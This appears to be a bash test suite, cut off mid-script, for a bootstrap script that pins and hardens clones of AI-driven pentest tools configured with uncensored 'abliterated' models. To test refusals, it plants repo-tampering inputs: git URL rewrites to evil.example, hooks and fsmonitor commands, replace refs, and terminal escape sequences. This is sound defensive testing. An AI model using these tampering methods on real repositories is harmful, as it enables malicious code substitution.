#!/usr/bin/env bash
# Functional test for scripts/bootstrap-upstream.sh against local fake upstream repos (no network).
# github.com URLs are redirected to local bare repos with git's url.<base>.insteadOf, given in the
# environment (command scope), never in a clone's own config.
#   bash tests/func/bootstrap_test.sh        (from the repo root; needs git >= 2.31, python3, perl)
set -euo pipefail
SRC_REPO="$(cd "${1:-$(dirname "$0")/../..}" && pwd -P)"
T="$(cd "$(mktemp -d "${TMPDIR:-/tmp}/bt.XXXXXX")" && pwd -P)"
trap 'rm -rf "$T"' EXIT
mode(){ python3 -c 'import os,sys; print(oct(os.stat(sys.argv[1]).st_mode & 0o777)[2:])' "$1"; }
mkdir -p "$T/up" "$T/work" "$T/home/GitHub/.sec-ops/configs/generated" "$T/bin"
mkdir -p "$T/repo" && (cd "$SRC_REPO" && tar cf - --exclude .git --exclude __pycache__ .) | (cd "$T/repo" && tar xf -)

# Only this test's git settings: none from the user's ~/.gitconfig or the system's.
export GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_NOSYSTEM=1
export GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@t GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@t
mk(){ # mk owner name ; builds $T/up/owner/name.git with 2 commits, prints both hashes
  local owner="$1" name="$2" w="$T/work/$2"
  mkdir -p "$w" "$T/up/$owner"
  git -C "$w" init -q -b main
  case "$name" in
    pentagi) echo "upstream example" > "$w/example.ollama.provider.yml"
             printf 'OLLAMA_SERVER_URL=\nOLLAMA_SERVER_MODEL=\nOLLAMA_SERVER_CONFIG_PATH=\nEMBEDDING_URL=\nEMBEDDING_MODEL=\nCOOKIE_SIGNING_SALT=\nPENTAGI_POSTGRES_PASSWORD=\nPENTAGI_IMAGE=vxcontrol/pentagi:latest\nPGVECTOR_IMAGE=vxcontrol/pgvector:latest\nSCRAPER_IMAGE=vxcontrol/scraper:latest\nDOCKER_IMAGE_SELECTION_MODE=\nDOCKER_DEFAULT_IMAGE_FOR_PENTEST=\nLOCAL_SCRAPER_USERNAME=\nLOCAL_SCRAPER_PASSWORD=\nSCRAPER_PRIVATE_URL=\n' > "$w/.env.example" ;;
    ARTEX) printf 'POSTGRES_PASSWORD=\nARTEX_SECRET_KEY=\nARTEX_LLM_MODEL=\nARTEX_LLM_PROVIDER=\n' > "$w/.env.example" ;;
    kali-mcp) printf 'mcp>=1.0.0\npydantic>=2.5.3\nfastapi>=0.104.1\nuvicorn==0.24.0\npyyaml==6.0.1' > "$w/requirements.txt" ;;
    *) echo "$name" > "$w/README" ;;
  esac
  git -C "$w" add -A && git -C "$w" commit -qm one
  local c1; c1="$(git -C "$w" rev-parse HEAD)"
  echo "two" > "$w/CHANGELOG" && git -C "$w" add -A && git -C "$w" commit -qm two
  local c2; c2="$(git -C "$w" rev-parse HEAD)"
  git clone -q --bare "$w" "$T/up/$owner/$name.git"
  echo "$c1 $c2"
}
read -r P1 P2 < <(mk vxcontrol pentagi)
read -r A1 A2 < <(mk BaaRai ARTEX)
read -r H1 H2 < <(mk 0x4m4 hexstrike-ai)
read -r K1 K2 < <(mk evilbotnet kali-mcp)
read -r F1 F2 < <(mk nanbingxyz 5ire)
cat > "$T/repo/upstream/repos.lock" <<EOF
# name  url  commit
pentagi       https://github.com/vxcontrol/pentagi.git      $P1  # test
ARTEX         https://github.com/BaaRai/ARTEX.git           $A1
hexstrike-ai  https://github.com/0x4m4/hexstrike-ai.git     $H1
kali-mcp      https://github.com/evilbotnet/kali-mcp.git    $K1
5ire          https://github.com/nanbingxyz/5ire.git        $F1
EOF
export GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0="url.$T/up/.insteadOf" GIT_CONFIG_VALUE_0="https://github.com/"
export HOME="$T/home" SECSTACK_GH="$T/home/GitHub" SECOPS="$T/home/GitHub/.sec-ops"
GH="$SECSTACK_GH"
CFG="$SECOPS/configs"
printf 'STACK_VERSION=1\nCHAT_MODEL=qwen3.6-35b-a3b-abliterated\nEMBED_MODEL=nomic-embed-text\nPENTAGI_DEFAULT_PROVIDER=local-qwen36-moe\n' > "$CFG/stack.conf"
printf 'simple:\n  model: "qwen3.6-35b-a3b-abliterated"\n' > "$CFG/generated/ollama.provider.yml"
# uv stub: logs its arguments, so the venv step runs without network; fails the subcommand named in $T/uv.fail
printf '#!/bin/sh\necho "uv $*" >> "%s/uv.log"\nif [ "$1" = "$(cat "%s/uv.fail" 2>/dev/null)" ]; then echo "simulated uv $1 failure" >&2; exit 1; fi\n' \
  "$T" "$T" > "$T/bin/uv"; chmod +x "$T/bin/uv"
RENDER="$T/repo/scripts/render-env.py"
envget(){ python3 "$RENDER" --get "$1" --file "$2"; }   # what docker compose would read
export PATH="$T/bin:$PATH"

pass=0; fail=0
ok(){ echo "PASS $*"; pass=$((pass+1)); }
bad(){ echo "FAIL $*"; fail=$((fail+1)); }
run(){ "$T/repo/scripts/bootstrap-upstream.sh" "$@" > "$T/out.log" 2>&1; }
refused(){ # refused "what" "expected message"
  if run; then bad "$1 accepted"; else grep -q -- "$2" "$T/out.log" && ok "$1 refused" || { bad "$1: wrong error"; sed 's/^/    /' "$T/out.log"; }; fi
}

# 1. first run clones, pins, patches, renders
if run; then ok "first run"; else bad "first run"; sed 's/^/    /' "$T/out.log"; fi
[ "$(git -C "$GH/pentagi" rev-parse HEAD)" = "$P1" ] && ok "pentagi at pin" || bad "pentagi not at pin"
[ -f "$GH/hexstrike-ai/README" ] && ok "files checked out at the pin" || bad "nothing checked out"
grep -q 'pydantic>=2.5.3,<2.12' "$GH/kali-mcp/requirements.txt" && ok "kali-mcp patch applied" || bad "patch not applied"
grep -q '^OLLAMA_SERVER_MODEL=qwen3.6-35b-a3b-abliterated$' "$GH/pentagi/.env" && ok "pentagi model rendered" || bad "pentagi model"
grep -q '^PENTAGI_OLLAMA_SERVER_CONFIG_PATH=./secstack.ollama.provider.yml$' "$GH/pentagi/.env" && ok "provider path rendered" || bad "provider path"
grep -q '^DOCKER_IMAGE_SELECTION_MODE=fixed$' "$GH/pentagi/.env" && ok "image selection fixed" || bad "image selection"
grep -q '^DOCKER_INSIDE=false$' "$GH/pentagi/.env" && ok "terminals get no Docker socket" || bad "DOCKER_INSIDE not false"
grep -q '^DOCKER_DEFAULT_IMAGE_FOR_PENTEST=vxcontrol/kali-linux@sha256:' "$GH/pentagi/.env" && ok "kali image pinned" || bad "kali image"
grep -q '^ARTEX_LLM_MODEL=qwen3.6-35b-a3b-abliterated$' "$GH/ARTEX/.env" && ok "artex model rendered" || bad "artex model"
[ "$(envget DOCKER_NET_ADMIN "$GH/pentagi/.env")" = false ] && ok "terminals get no NET_ADMIN" || bad "DOCKER_NET_ADMIN not false"
[ "$(envget DOCKER_PUBLIC_IP "$GH/pentagi/.env")" = 127.0.0.2 ] && ok "flow ports published on 127.0.0.2" || bad "DOCKER_PUBLIC_IP not 127.0.0.2"
[ "$(envget ARTEX_BIND_ADDR "$GH/ARTEX/.env")" = 127.0.0.1 ] && ok "ARTEX bound to loopback" || bad "ARTEX_BIND_ADDR"
tail -n 1 "$GH/pentagi/.env" | grep -q '^DOCKER_DEFAULT_IMAGE_FOR_PENTEST=' && grep -q '^# ---- secstack overrides' "$GH/pentagi/.env" \
  && ok "overrides written as the last block" || bad "override block not last"
[ "$(mode "$GH/pentagi/.env")" = 600 ] && ok ".env is 600" || bad ".env perms $(mode "$GH/pentagi/.env")"
[ "$(mode "$GH/pentagi")" = 700 ] && [ "$(mode "$GH/ARTEX")" = 700 ] && ok "clones holding secrets are 700" || bad "clone perms"
for f in custom ollama bedrock; do
  p="$GH/pentagi/secstack.$f.provider.yml"
  [ -f "$p" ] && [ "$(mode "$p")" = 600 ] || bad "secstack.$f.provider.yml missing or not 600"
done && ok "provider files written (600)"
head -1 "$GH/pentagi/docker-compose.override.yml" | grep -q '^# secstack-managed' \
  && grep -q 'restart: "no"' "$GH/pentagi/docker-compose.override.yml" && ok "compose override: no restart" || bad "compose override"
salt1="$(grep '^COOKIE_SIGNING_SALT=' "$GH/pentagi/.env")"
[ ${#salt1} -gt 32 ] && ok "secret generated" || bad "secret empty or short"
grep -q -- "venv -q -p 3.12 $SECOPS/venv" "$T/uv.log" && ok "venv in the runtime root" || bad "venv location: $(cat "$T/uv.log")"
grep -q -- "pip sync -q --require-hashes --no-build -p $SECOPS/venv/bin/python3" "$T/uv.log" \
  && ok "hash-locked venv sync" || bad "venv sync not hash-locked"

# 2. re-run with a new plan: model keys refresh, secrets kept, patch applied exactly once
perl -pi -e 's/^CHAT_MODEL=.*/CHAT_MODEL=gemma4-26b-abliterated/' "$CFG/stack.conf"
if run; then ok "second run"; else bad "second run"; sed 's/^/    /' "$T/out.log"; fi
grep -q '^OLLAMA_SERVER_MODEL=gemma4-26b-abliterated$' "$GH/pentagi/.env" && ok "model refreshed" || bad "model not refreshed"
[ "$(grep '^COOKIE_SIGNING_SALT=' "$GH/pentagi/.env")" = "$salt1" ] && ok "secret kept" || bad "secret rotated"
[ "$(grep -c 'pydantic>=2.5.3,<2.12' "$GH/kali-mcp/requirements.txt")" = 1 ] && grep -q 'kali-mcp: applied' "$T/out.log" \
  && ok "patch re-applied once" || bad "patch state after re-run"

# 3. moving the pin: patched tree is un-patched, checked out, re-patched
perl -pi -e "s/$K1/$K2/" "$T/repo/upstream/repos.lock"
if run; then ok "pin move with patch"; else bad "pin move"; sed 's/^/    /' "$T/out.log"; fi
[ "$(git -C "$GH/kali-mcp" rev-parse HEAD)" = "$K2" ] && ok "kali-mcp moved to new pin" || bad "kali-mcp pin"
grep -q 'pydantic>=2.5.3,<2.12' "$GH/kali-mcp/requirements.txt" && ok "patch re-applied" || bad "patch missing after move"

# 4. edited tracked files are caught, with or without a pin move
echo "tampered" >> "$GH/hexstrike-ai/README"
refused "edited file at the pin" "tracked files differ"
grep -q '^      README$' "$T/out.log" && ok "the edited file is listed" || bad "edited file not listed"
git -C "$GH/hexstrike-ai" checkout -q -- README
echo "old secstack provider" > "$GH/pentagi/example.ollama.provider.yml"      # what earlier versions did
refused "upstream example file overwritten" "An earlier secstack wrote"
git -C "$GH/pentagi" checkout -q -- example.ollama.provider.yml
echo "local edit" >> "$GH/pentagi/.env.example"
perl -pi -e "s/$P1/$P2/" "$T/repo/upstream/repos.lock"
refused "edited file before a pin move" "tracked files differ"
[ "$(git -C "$GH/pentagi" rev-parse HEAD)" = "$P1" ] && ok "pin not moved over local edits" || bad "pin moved over local edits"
git -C "$GH/pentagi" checkout -q -- .env.example

# 5. origin must be exactly the lock's URL, with no repo-local URL rewrite
git -C "$GH/hexstrike-ai" remote set-url origin https://github.com/evil/hexstrike-ai.git
refused "wrong origin" "origin is"
git -C "$GH/hexstrike-ai" remote set-url origin https://github.com/0x4m4/hexstrike-ai.git
git -C "$GH/hexstrike-ai" config --add remote.origin.url https://github.com/evil/hexstrike-ai.git
refused "second origin URL" "origin is"
git -C "$GH/hexstrike-ai" config --unset-all remote.origin.url
git -C "$GH/hexstrike-ai" config remote.origin.url https://github.com/0x4m4/hexstrike-ai.git
git -C "$GH/hexstrike-ai" config url.https://evil.example/.insteadOf https://github.com/
refused "repo-local insteadOf" "config --unset-all url.https://evil.example/.insteadof"
git -C "$GH/hexstrike-ai" config --unset url.https://evil.example/.insteadOf

# 6. bad lock entries are refused before anything is fetched
cp "$T/repo/upstream/repos.lock" "$T/lock.bak"
perl -pi -e "s#https://github.com/0x4m4/hexstrike-ai.git#http://evil.example/x.git#" "$T/repo/upstream/repos.lock"
refused "non-github URL" "only https://github.com"
cp "$T/lock.bak" "$T/repo/upstream/repos.lock"
perl -pi -e "s/$H1/${H1:0:12}/" "$T/repo/upstream/repos.lock"
refused "short hash" "full 40-character"
cp "$T/lock.bak" "$T/repo/upstream/repos.lock"
perl -pi -e "s/^hexstrike-ai /.hidden /" "$T/repo/upstream/repos.lock"
refused "dot repo name" "bad repo name"
cp "$T/lock.bak" "$T/repo/upstream/repos.lock"

# 7. unknown pinned commit
perl -pi -e "s/$F1/0000000000000000000000000000000000000000/" "$T/repo/upstream/repos.lock"
refused "missing commit" "not found"
cp "$T/lock.bak" "$T/repo/upstream/repos.lock"

# 8. nothing is written through a symlink; a weak secret stops the run
mv "$GH/pentagi/secstack.ollama.provider.yml" "$T/saved.yml"
ln -s "$T/elsewhere.yml" "$GH/pentagi/secstack.ollama.provider.yml"
refused "symlinked provider file" "is a symlink"
[ ! -e "$T/elsewhere.yml" ] && ok "nothing written through the link" || bad "wrote through a symlink"
rm "$GH/pentagi/secstack.ollama.provider.yml"; mv "$T/saved.yml" "$GH/pentagi/secstack.ollama.provider.yml"
cp "$GH/pentagi/.env" "$T/env.bak"
perl -pi -e 's/^COOKIE_SIGNING_SALT=.*/COOKIE_SIGNING_SALT=short/' "$GH/pentagi/.env"
refused "weak secret" "weak secrets"
cp "$T/env.bak" "$GH/pentagi/.env"

# 9. pentagi's compose override must be exactly the file secstack ships: anything else is refused (and
#    left in place), even with secstack's first line
cmp -s "$T/repo/upstream/pentagi/docker-compose.override.yml" "$GH/pentagi/docker-compose.override.yml" \
  && ok "the managed override is the shipped file" || bad "managed override differs from upstream/pentagi/docker-compose.override.yml"
printf 'services:\n  pentagi:\n    ports: ["0.0.0.0:9999:8443"]\n' > "$GH/pentagi/docker-compose.override.yml"
refused "foreign compose override" "docker-compose.override.yml isn't the file secstack writes"
grep -q '9999' "$GH/pentagi/docker-compose.override.yml" && grep -q 'mv .*docker-compose.override.yml .*docker-compose.override.yml.off' "$T/out.log" \
  && ok "foreign override left in place, with the mv command" || bad "foreign override handling"
{ head -1 "$T/repo/upstream/pentagi/docker-compose.override.yml"; printf 'services:\n  pentagi:\n    privileged: true\n'; } \
  > "$GH/pentagi/docker-compose.override.yml"
refused "override with secstack's first line but other content" "isn't the file secstack writes"
rm "$GH/pentagi/docker-compose.override.yml"

# 10. --latest reports and changes nothing: it fetches the lock URL's HEAD (not origin's refs) and
#     keeps only tab, newline and printable ASCII of upstream commit subjects (no C0/C1 escapes, no bidi)
w="$T/work/5ire"; echo esc >> "$w/CHANGELOG"
git -C "$w" commit -qam "$(printf 'docs: typo\033[8m hidden\033]52;c;eA==\007 end \302\2332J \342\200\256rtl')"
git -C "$w" push -q "$T/up/nanbingxyz/5ire.git" main
head_before="$(git -C "$GH/pentagi" rev-parse HEAD)"; env_before="$(cat "$GH/pentagi/.env")"
origin_before="$(git -C "$GH/5ire" rev-parse refs/remotes/origin/main)"
if run --latest; then ok "--latest"; else bad "--latest failed"; sed 's/^/    /' "$T/out.log"; fi
grep -q 'hexstrike-ai: 1 commits past the pin' "$T/out.log" && ok "--latest reports commits past the pin" || { bad "--latest report"; sed 's/^/    /' "$T/out.log"; }
grep -q '5ire: 2 commits past the pin' "$T/out.log" && grep -q 'docs: typo\[8m hidden' "$T/out.log" \
  && ok "--latest reports the lock URL's HEAD" || { bad "--latest 5ire report"; sed 's/^/    /' "$T/out.log"; }
if python3 -c 'import sys; d = open(sys.argv[1], "rb").read(); sys.exit(not any((b < 32 and b not in (9, 10)) or b > 126 for b in d))' "$T/out.log"; then
  bad "--latest passed control, C1 or bidi characters through"; else ok "--latest output is tab, newline and printable ASCII"; fi
[ "$(git -C "$GH/pentagi" rev-parse HEAD)" = "$head_before" ] && [ "$(cat "$GH/pentagi/.env")" = "$env_before" ] \
  && [ "$(git -C "$GH/5ire" rev-parse refs/remotes/origin/main)" = "$origin_before" ] \
  && ok "--latest changed nothing (origin refs included)" || bad "--latest changed a clone"

# 11. final clean run: the pending pentagi pin move now goes through, override restored
if run; then ok "final run"; else bad "final run"; sed 's/^/    /' "$T/out.log"; fi
[ "$(git -C "$GH/pentagi" rev-parse HEAD)" = "$P2" ] && ok "pentagi moved to new pin" || bad "pentagi pin after cleanup"
head -1 "$GH/pentagi/docker-compose.override.yml" | grep -q '^# secstack-managed' && ok "override restored" || bad "override not restored"

# 12. a clone's hooks never run (fetch, pin move), whatever .git/hooks holds
for h in reference-transaction post-checkout post-index-change; do
  printf '#!/bin/sh\necho %s >> "%s/hooks.log"\n' "$h" "$T" > "$GH/hexstrike-ai/.git/hooks/$h"
  chmod +x "$GH/hexstrike-ai/.git/hooks/$h"
done
w="$T/work/hexstrike-ai"; echo three >> "$w/CHANGELOG"; git -C "$w" commit -qam three; H3="$(git -C "$w" rev-parse HEAD)"
git -C "$w" push -q "$T/up/0x4m4/hexstrike-ai.git" main
perl -pi -e "s/$H1/$H3/" "$T/repo/upstream/repos.lock"
if run; then ok "run with planted hooks"; else bad "run with planted hooks"; sed 's/^/    /' "$T/out.log"; fi
[ "$(git -C "$GH/hexstrike-ai" rev-parse HEAD)" = "$H3" ] && [ ! -e "$T/hooks.log" ] \
  && ok "hooks never ran" || bad "hooks ran: $(cat "$T/hooks.log" 2>/dev/null)"
for h in reference-transaction post-checkout post-index-change; do rm "$GH/hexstrike-ai/.git/hooks/$h"; done

# 13. local config outside the allowlist is refused, key by key, and its commands never run
cfg_refused(){ # cfg_refused KEY VALUE EXPECTED-MESSAGE
  git -C "$GH/hexstrike-ai" config "$1" "$2"
  refused "repo-local $1" "$3"
  git -C "$GH/hexstrike-ai" config --unset-all "$1"
}
cfg_refused core.fsmonitor "echo fsmonitor >> '$T/hooks.log'; false" "config --unset-all core.fsmonitor"
[ ! -e "$T/hooks.log" ] && ok "fsmonitor command never ran" || bad "fsmonitor ran"
git clone -q --bare "$T/up/0x4m4/hexstrike-ai.git" "$T/evil.git"
printf '[url "%s/evil.git"]\n\tinsteadOf = https://github.com/0x4m4/hexstrike-ai.git\n' "$T" > "$T/inc.cfg"
cfg_refused include.path "$T/inc.cfg" "config --unset-all include.path"
cfg_refused 'includeIf.gitdir:**.path' "$T/inc.cfg" "config --unset-all includeif.gitdir:"
cfg_refused core.worktree "$T/elsewhere" "config --unset-all core.worktree"
cfg_refused core.hooksPath "$T/hooks" "config --unset-all core.hookspath"
cfg_refused extensions.worktreeConfig true "extensions.worktreeconfig='true'; removing it would break the clone, so clone it again"
grep -q "git clone --no-checkout https://github.com/0x4m4/hexstrike-ai.git" "$T/out.log" && ok "extension keys get re-clone advice" || bad "re-clone advice"
# An unknown ref store: git 2.43 reads such a config and the vetting refuses the key; newer git (the
# Mac's 2.5x) can't read the config at all, and the vetting refuses that. Refused either way.
git -C "$GH/hexstrike-ai" config extensions.refstorage bogus
if run; then bad "repo-local extensions.refstorage accepted"
elif grep -e "extensions.refstorage='bogus'; removing it would break the clone" \
          -e "git can't read .*/\.git/config; fix or re-clone it" "$T/out.log" >/dev/null; then ok "repo-local extensions.refstorage refused"
else bad "repo-local extensions.refstorage: wrong error"; sed 's/^/    /' "$T/out.log"; fi
# Removed by hand: newer git won't edit a config it can't read either.
python3 -c 'import re, sys; p = sys.argv[1]; t = open(p).read(); open(p, "w").write(re.sub(r"(?mi)^\s*refstorage\s*=\s*bogus\s*\n", "", t))' \
  "$GH/hexstrike-ai/.git/config"
cfg_refused remote.origin.promisor true "remote.origin.promisor='true'; removing it would break the clone"
# What git 2.45+ may write itself: extensions.refstorage=files, with repository format 1 (newer git refuses
# that extension in a format-0 repo). Older git refuses an extension it doesn't know in format 1 and
# ignores extensions in format 0, so the format follows what this git accepts. Edited without git, which
# may refuse to touch such a config.
cfgedit(){ python3 - "$GH/hexstrike-ai/.git/config" "$1" <<'PY'
import re, sys
p, op = sys.argv[1], sys.argv[2]
t = open(p).read()
t = re.sub(r"(?mi)^\s*refstorage\s*=\s*files\s*\n", "", t)
t = re.sub(r"(?mi)^\[extensions\]\s*\n(?=\[|\Z)", "", t)
version = "0"
if op in ("v0", "v1"):
    t += "[extensions]\n\trefstorage = files\n"
    version = op[1]
t = re.sub(r"(?mi)^(\s*repositoryformatversion\s*=\s*)\d+", lambda m: m.group(1) + version, t)
open(p, "w").write(t)
PY
}
cfgedit v1; git -C "$GH/hexstrike-ai" rev-parse -q HEAD >/dev/null 2>&1 || cfgedit v0
if run; then ok "extensions.refstorage=files allowed"; else bad "extensions.refstorage=files refused"; sed 's/^/    /' "$T/out.log"; fi
cfgedit off
git -C "$GH/hexstrike-ai" config remote.origin.fetch '+refs/pull/1/head:refs/remotes/origin/main'
refused "a fetch refspec that maps a PR onto origin/main" "fetches '+refs/pull/1/head"
git -C "$GH/hexstrike-ai" config remote.origin.fetch '+refs/heads/*:refs/remotes/origin/*'
git -C "$GH/hexstrike-ai" config branch.main.vscode-merge-base origin/main     # editors write branch keys: allowed
if run; then ok "branch.* keys allowed"; else bad "branch.* key refused"; sed 's/^/    /' "$T/out.log"; fi
git -C "$GH/hexstrike-ai" config --unset branch.main.vscode-merge-base

# 14. files in .git that change which objects, config or attributes git uses are refused
gd="$GH/hexstrike-ai/.git"
dot_git_refused(){ # dot_git_refused PATH CONTENT
  mkdir -p "$(dirname "$gd/$1")"; printf '%s\n' "$2" > "$gd/$1"
  refused ".git/$1" "$gd/$1 changes which"
  rm "$gd/$1"
}
dot_git_refused info/attributes '* filter=evil'
dot_git_refused info/grafts "$H3"
dot_git_refused objects/info/alternates "$T/up/0x4m4/hexstrike-ai.git/objects"
dot_git_refused config.worktree "$(printf '[core]\n\tbare = false')"
dot_git_refused commondir .

# 15. a replace ref can't swap the pinned commit's tree
d="$GH/pentagi"
evil_blob="$(printf 'DOCKER_INSIDE=true\n' | git -C "$d" hash-object -w --stdin)"
evil_tree="$(git -C "$d" ls-tree HEAD | sed "s/[0-9a-f]\{40\}\(	\.env\.example\)$/$evil_blob\1/" | git -C "$d" mktree)"
[ "$evil_tree" != "$(git -C "$d" rev-parse 'HEAD^{tree}')" ] || bad "test setup: tree not swapped"
git -C "$d" replace "$P2" "$(git -C "$d" commit-tree "$evil_tree" -m evil)"
git -C "$d" checkout -q -f --detach "$P2"         # the worktree now holds the swapped tree, and git diff HEAD is clean
[ "$(cat "$d/.env.example")" = DOCKER_INSIDE=true ] && git -C "$d" diff --quiet HEAD -- || bad "test setup: swap not in place"
refused "replace ref for the pin" "refs/replace/$P2 makes git show another commit"
git -C "$d" replace -d "$P2" >/dev/null; git -C "$d" checkout -q -f --detach "$P2"
[ "$(cat "$d/.env.example")" = DOCKER_INSIDE=true ] && bad "replace ref cleanup" || ok "pinned tree restored"

# 16. edits hidden from git diff by index flags, and staged edits, are refused
hx="$GH/hexstrike-ai"
echo tampered >> "$hx/README"; git -C "$hx" update-index --assume-unchanged README
refused "edit hidden by assume-unchanged" "hide local edits"
git -C "$hx" update-index --no-assume-unchanged README; git -C "$hx" update-index --skip-worktree README
refused "edit hidden by skip-worktree" "hide local edits"
git -C "$hx" update-index --no-skip-worktree README; git -C "$hx" checkout -q -- README
echo staged >> "$hx/README"; git -C "$hx" add README
refused "staged edit (index differs from HEAD)" "tracked files differ"
git -C "$hx" reset -q -- README; git -C "$hx" checkout -q -- README

# 17. compose files the pinned commit doesn't track (ignored or not) are refused in pentagi and ARTEX
for f in compose.override.yml compose.yaml docker-compose.override.yaml; do
  printf 'services:\n  pentagi:\n    privileged: true\n' > "$GH/pentagi/$f"
  refused "untracked pentagi/$f" "pentagi/$f isn't part of the pinned commit"
  rm "$GH/pentagi/$f"
done
printf 'compose.yml\n' >> "$GH/ARTEX/.git/info/exclude"; printf 'services: {}\n' > "$GH/ARTEX/compose.yml"
[ -n "$(git -C "$GH/ARTEX" status --porcelain --ignored -- compose.yml | grep '^!!')" ] || bad "test setup: compose.yml not ignored"
refused "ignored ARTEX/compose.yml" "ARTEX/compose.yml isn't part of the pinned commit"
rm "$GH/ARTEX/compose.yml"

# 18. a pin that tracks .env (in any letter case: APFS ignores case), a secstack.* file or pentagi's
#     docker-compose.override.yml is refused before checkout
w="$T/work/pentagi"
for f in .env .ENV secstack.ollama.provider.yml docker-compose.override.yml; do
  printf 'PUBLISHED_UPSTREAM=1\n' > "$w/$f"; git -C "$w" add -f "$f"; git -C "$w" commit -qm "add $f"
  git -C "$w" push -q "$T/up/vxcontrol/pentagi.git" main; PX="$(git -C "$w" rev-parse HEAD)"
  perl -pi -e "s/$P2/$PX/" "$T/repo/upstream/repos.lock"
  refused "pin that tracks $f" "the pinned commit tracks $f"
  [ "$(git -C "$GH/pentagi" rev-parse HEAD)" = "$P2" ] && ok "pin not moved to a commit tracking $f" || bad "moved to a commit tracking $f"
  perl -pi -e "s/$PX/$P2/" "$T/repo/upstream/repos.lock"; git -C "$w" rm -q --cached "$f"; rm "$w/$f"; git -C "$w" commit -qm "drop $f"
done

# 19. a patch that doesn't apply stops the run, even when a later patch applies
w="$T/work/kali-mcp"
printf 'mcp>=1.0.0\npydantic>=2.6\nfastapi>=0.104.1\nuvicorn==0.24.0\npyyaml==6.0.1' > "$w/requirements.txt"
git -C "$w" commit -qam "bump pydantic"; K3="$(git -C "$w" rev-parse HEAD)"; git -C "$w" push -q "$T/up/evilbotnet/kali-mcp.git" main
printf 'diff --git a/NOTES b/NOTES\nnew file mode 100644\n--- /dev/null\n+++ b/NOTES\n@@ -0,0 +1 @@\n+secstack note\n' \
  > "$T/repo/upstream/patches/kali-mcp-0002-notes.patch"
perl -pi -e "s/$K2/$K3/" "$T/repo/upstream/repos.lock"
refused "failing patch followed by a working one" "kali-mcp-0001-pin-pydantic.patch doesn't apply"
grep -q '^done' "$T/out.log" && bad "run went on after a failed patch" || ok "nothing after the failed patch"
perl -pi -e "s/$K3/$K2/" "$T/repo/upstream/repos.lock"; rm "$T/repo/upstream/patches/kali-mcp-0002-notes.patch"

# 20. a provider path that is a directory (Docker creates missing bind sources as directories) is refused
mv "$GH/pentagi/secstack.ollama.provider.yml" "$T/saved.yml"; mkdir "$GH/pentagi/secstack.ollama.provider.yml"
refused "directory at a provider path" "secstack.ollama.provider.yml is a symlink or not a regular file"
rmdir "$GH/pentagi/secstack.ollama.provider.yml"; mv "$T/saved.yml" "$GH/pentagi/secstack.ollama.provider.yml"

# 21. assignments Compose reads but a line-based reader misses can't override the overrides
cp "$GH/pentagi/.env" "$T/env.bak"
printf 'export DOCKER_INSIDE=true\n  PENTAGI_LISTEN_IP=0.0.0.0\nDOCKER_NETWORK: bridge\nX="a" DOCKER_NET_ADMIN=true\n' >> "$GH/pentagi/.env"
[ "$(envget DOCKER_INSIDE "$GH/pentagi/.env")" = true ] || bad "test setup: compose wouldn't read the appended lines"
if run; then ok "run with a tampered .env"; else bad "tampered .env run"; sed 's/^/    /' "$T/out.log"; fi
[ "$(envget DOCKER_INSIDE "$GH/pentagi/.env")" = false ] && [ "$(envget PENTAGI_LISTEN_IP "$GH/pentagi/.env")" = 127.0.0.1 ] \
  && [ "$(envget DOCKER_NETWORK "$GH/pentagi/.env")" = pentest-net ] && [ "$(envget DOCKER_NET_ADMIN "$GH/pentagi/.env")" = false ] \
  && [ "$(grep '^COOKIE_SIGNING_SALT=' "$GH/pentagi/.env")" = "$salt1" ] \
  && ok "every override wins again, secrets kept" || { bad "tampered .env not repaired"; tail -20 "$GH/pentagi/.env" | sed 's/^/    /'; }
cp "$T/env.bak" "$GH/pentagi/.env"

# 22. a failing venv sync stops the run
echo pip > "$T/uv.fail"
refused "failing venv sync" "simulated uv pip failure"
grep -q '^done' "$T/out.log" && bad "reported done after a failed venv sync" || ok "no done after a failed venv sync"
rm "$T/uv.fail"

# 23. hexstrike Dockerfile: the security-tools RUN fails when apt-get update fails or nothing installs.
#     Its shell runs here with apt-get/ln/rm stubs and every absolute path moved under $T/dock.
mkdir -p "$T/dock/bin" "$T/dock/lists"
python3 - "$T/repo/configs/hexstrike-kali/Dockerfile" "$T/dock" > "$T/dock/run.sh" <<'PY'
import re, shlex, sys
text = open(sys.argv[1]).read().replace("\\\n", " ")
run = [l[4:] for l in text.splitlines() if l.startswith("RUN ") and "for p in" in l]
assert len(run) == 1, "expected one RUN with the tools loop"
script = run[0]
paths = ("/opt/tools.txt", "/usr/bin/httpx-toolkit", "/usr/local/bin/httpx", "/var/lib/apt/lists")
for i, a in enumerate(paths):
    script = script.replace(a, f"@@PATH{i}@@")
assert not re.search(r"(^|[\s'\"=])/(opt|usr|var|etc|bin)/", script), script
for i, a in enumerate(paths):   # quoted: the test directory may contain spaces
    script = script.replace(f"@@PATH{i}@@", shlex.quote(sys.argv[2] + "/" + a.replace("/", "_")))
print(script)
PY
for t in apt-get ln rm; do printf '#!/bin/sh\necho "%s $*" >> "%s/dock/calls"\n' "$t" "$T" > "$T/dock/bin/$t"; done
printf '#!/bin/sh\necho "apt-get $*" >> "%s/dock/calls"\n[ "$1" = update ] && [ -e "%s/dock/fail-update" ] && exit 100\n[ "$1" = install ] && [ -e "%s/dock/fail-install" ] && exit 100\nexit 0\n' \
  "$T" "$T" "$T" > "$T/dock/bin/apt-get"
chmod +x "$T/dock/bin/"*
dock(){ rm -f "$T/dock/_opt_tools.txt"; PATH="$T/dock/bin:$PATH" sh -c "$(cat "$T/dock/run.sh")" >/dev/null 2>&1; }
if dock && grep -q '^OK nmap$' "$T/dock/_opt_tools.txt"; then ok "Dockerfile tools RUN succeeds normally"; else bad "Dockerfile tools RUN failed with working apt"; fi
touch "$T/dock/fail-update"
if dock; then bad "Dockerfile tools RUN succeeded after apt-get update failed"; else ok "failed apt-get update fails the build"; fi
mv "$T/dock/fail-update" "$T/dock/fail-install"
if dock; then bad "Dockerfile tools RUN succeeded with no tool installed"; else ok "no tool installed fails the build"; fi

# 24. caches in .git can't hide edits: forged stat data in the clone's index (files are compared through
#     a fresh index), a forged commit-graph (off) and a planted object (git fsck)
d="$GH/pentagi"
echo tampered >> "$d/.env.example"; touch -t 202001010000 "$d/.env.example"
python3 - "$d/.git/index" .env.example "$d/.env.example" <<'PY'
import hashlib, os, struct, sys
idx, rel, path = sys.argv[1:4]
data = bytearray(open(idx, "rb").read())
version, count = struct.unpack(">II", data[4:12])
